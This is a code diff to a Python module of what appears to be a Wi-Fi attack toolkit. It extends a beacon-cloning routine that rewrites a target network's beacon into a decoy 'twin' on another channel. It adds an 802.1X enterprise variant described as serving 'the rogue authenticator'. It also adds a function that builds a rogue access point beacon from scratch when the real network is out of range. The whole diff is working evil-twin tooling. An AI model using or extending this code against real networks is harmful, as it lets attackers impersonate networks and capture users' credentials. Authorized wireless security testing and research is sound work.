@@ -9,9 +9,10 @@ from typing import Optional
 
 from wifit3.dot11.chan import same_band
 from wifit3.dot11.ie import (
-    GENERIC_RSN_IE, ds_param_ie, ext_rates_ie, force_psk_akm,
-    iter_information_elements, rates_ie,
+    GENERIC_RSN_IE, GENERIC_RSN_IE_ENTERPRISE, ds_param_ie, ext_rates_ie, force_psk_akm,
+    iter_information_elements, rates_ie, ssid_ie,
 )
+from wifit3.dot11.rsn import AKM_802_1X, AKM_PSK
 from wifit3.dot11.eapol import data_header, eapol_key, LLC_SNAP_EAPOL
 from wifit3.dot11.mac import mac_header
 
@@ -137,9 +138,12 @@ def _beacon_channel(tags: bytes) -> Optional[int]:
     return ht_op_primary
 
 
-def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] = None) -> bytes:
-    """The target's beacon rewritten to a 20 MHz WPA2-PSK twin. ``bssid`` rewrites Addr2/Addr3.
-    Rates are the target's, or generic ones for ``decoy_channel`` when it is on the other band."""
+def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] = None, *,
+                 akm: int = AKM_PSK, pmf_capable: bool = False,
+                 fallback_rsn: bytes = GENERIC_RSN_IE) -> bytes:
+    """The target's beacon rewritten to a 20 MHz twin advertising a single ``akm`` (PSK by default;
+    802.1X for the enterprise twin). ``bssid`` rewrites Addr2/Addr3. Rates are the target's, or
+    generic ones for ``decoy_channel`` when it is on the other band."""
     if len(real_beacon) < _BEACON_HEAD:
         raise ValueError(f"beacon too short to rewrite: {len(real_beacon)} bytes")
     head = bytearray(real_beacon[:_BEACON_HEAD])
@@ -163,7 +167,7 @@ def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] 
         elif tag_id == _ELEMID_HT_CAP:
             kept += _ht_cap_to_20mhz(elem)
         elif tag_id == _ELEMID_RSN:
-            kept += force_psk_akm(elem) or GENERIC_RSN_IE
+            kept += force_psk_akm(elem, akm=akm, pmf_capable=pmf_capable) or fallback_rsn
         elif tag_id == _ELEMID_DS:
             kept += ds_param_ie(decoy_channel)
         elif tag_id == _ELEMID_HT_OP:
@@ -173,3 +177,24 @@ def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] 
         elif tag_id != _ELEMID_RSNXE:
             kept += elem
     return bytes(head) + bytes(kept)
+
+
+def beacon_clone_enterprise(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] = None, *,
+                            pmf_capable: bool = False) -> bytes:
+    """A twin beacon advertising WPA2-Enterprise (802.1X AKM), for the rogue authenticator."""
+    return beacon_clone(real_beacon, decoy_channel, bssid, akm=AKM_802_1X, pmf_capable=pmf_capable,
+                        fallback_rsn=GENERIC_RSN_IE_ENTERPRISE)
+
+
+def build_enterprise_beacon(ssid: str, channel: int, bssid: bytes, *,
+                            pmf_capable: bool = False) -> bytes:
+    """Synthesize a WPA2-Enterprise (802.1X) beacon from scratch, for standing up a rogue AP when
+    the target network is not in range (no beacon to clone). ESS + Privacy, 802.1X RSN."""
+    header = mac_header(b"\x80\x00", b"\xff\xff\xff\xff\xff\xff", bssid, bssid)
+    fixed = struct.pack("<QHH", 0, 100, _CAP_ESS_PRIVACY)      # timestamp, interval (TU), capability
+    rsn = GENERIC_RSN_IE_ENTERPRISE
+    if pmf_capable:
+        rsn = force_psk_akm(rsn, akm=AKM_802_1X, pmf_capable=True) or rsn
+    ies = (ssid_ie(ssid) + rates_ie(channel) + ext_rates_ie(channel)
+           + ds_param_ie(channel) + rsn)
+    return header + fixed + ies
